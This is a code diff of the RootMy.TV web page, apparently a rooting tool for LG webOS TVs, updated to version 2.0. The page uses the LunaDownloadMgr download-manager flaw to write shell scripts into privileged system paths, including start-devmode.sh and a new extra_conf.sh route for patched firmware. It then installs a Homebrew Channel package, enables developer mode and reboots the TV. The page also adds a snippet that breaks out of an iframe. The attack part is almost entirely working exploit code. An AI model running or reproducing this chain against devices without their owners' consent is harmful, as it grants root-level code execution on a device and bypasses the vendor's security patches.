@@ -8,7 +8,7 @@
 
 <body>
   <header>
-    <h1>RootMy.TV</h1>
+    <h1>RootMy.TV<small> 2.0</small></h1>
   </header>
   <hr>
   <section class="content-center">
@@ -19,6 +19,12 @@
   <hr>
   <script src="lib/webOSTV.js"></script>
   <script>
+    // Break out of an iframe...
+    if (window !== window.top) {
+      window.top.location.href = location.href
+    }
+  </script>
+  <script>
     function log(str) {
       var logBox = document.querySelector('#log');
       logBox.innerText = logBox.innerText + str + '\n';
@@ -28,7 +34,7 @@
     window.onerror = function (err) {log('Unexpected error: ' + err);};
 
     (function () {
-      function download(url, targetDir, targetFilename, success) {
+      function download(url, targetDir, targetFilename, success, failure) {
         var target = new URL(url, window.location.href).href;
         log(targetFilename + ': Downloading from ' + target + '...');
         webOS.service.request('luna://com.webos.service.downloadmanager', {
@@ -43,7 +49,11 @@
           onSuccess: function (res) {
             if (res.completed === true) {
               if (res.destPath !== targetDir) {
-                log(targetFilename + ': Download completed, but target directory (' + res.destPath + ') did not match what we expected (' + targetDir + '). This likely means your TV is not vulnerable to LunaDownloadMgr exploit.');
+                if (failure != undefined) {
+                  failure(res);
+                } else {
+                  log(targetFilename + ': Download completed, but target directory (' + res.destPath + ') did not match what we expected (' + targetDir + '). This likely means your TV is not vulnerable to LunaDownloadMgr exploit.');
+                }
               } else if (res.httpStatus !== 200) {
                 log(targetFilename + ': Download completed, but finished with a HTTP status code ' + res.httpStatus);
               } else {
@@ -54,7 +64,11 @@
           },
 
           onFailure: function (err) {
-            log('err: ' + JSON.stringify(err));
+            log(targetFilename + ': Luna call failed: ' + JSON.stringify(err));
+
+            if (failure != undefined) {
+              failure(err);
+            }
           },
         });
       }
@@ -63,7 +77,7 @@
         webOS.service.request('luna://com.webos.service.sleep', {
           method: 'shutdown/machineReboot',
           parameters: {
-            reason: "SwDownload"
+            reason: "remoteKey"
           },
           onSuccess: function (res) {
             log("Reboot request succeeded. Bye?");
@@ -74,13 +88,29 @@
         });
       }
 
-      var homebrewChannelURL = 'https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.3.2/org.webosbrew.hbchannel_0.3.2_all.ipk';
+      var homebrewChannelURL = 'https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.4.0/org.webosbrew.hbchannel_0.4.0_all.ipk';
 
-      download('files/stage3.sh', '/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/', 'start-devmode.sh', function () {
-        download(homebrewChannelURL, '/media/internal/downloads/', 'hbchannel.ipk', function () {
-          download('files/devmode_enabled', '/var/luna/preferences/', 'devmode_enabled', function () {
-            reboot();
+      function bootstrapStage3() {
+        download('files/stage3.sh', '/mnt/lg/cmn_data/var/lib/webosbrew/', 'startup.sh', function () {
+          download(homebrewChannelURL, '/mnt/lg/appstore/internal/downloads/', 'hbchannel.ipk', function () {
+            download('files/dummy', '/mnt/lg/cmn_data/var/luna/preferences/', 'devmode_enabled', function () {
+              log("Your TV shall reboot in 5 seconds...");
+              setTimeout(function () {
+                reboot();
+              }, 5000);
+            });
           });
+        });
+      }
+
+      // Attempt to go through original pre-2021/06 route. This will fail on patched TVs.
+      download('files/jumpstart.sh', '/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/', 'start-devmode.sh', function () {
+        log("Original start-devmode.sh overwrite succeeded, using original chain...");
+        bootstrapStage3();
+      }, function () {
+        log("Original start-devmode.sh overwrite failed, attempting v2 exploit...");
+        download('files/jumpstart.sh', '/mnt/lg/cmn_data/wam/', 'extra_conf.sh', function () {
+          bootstrapStage3();
         });
       });
     })();
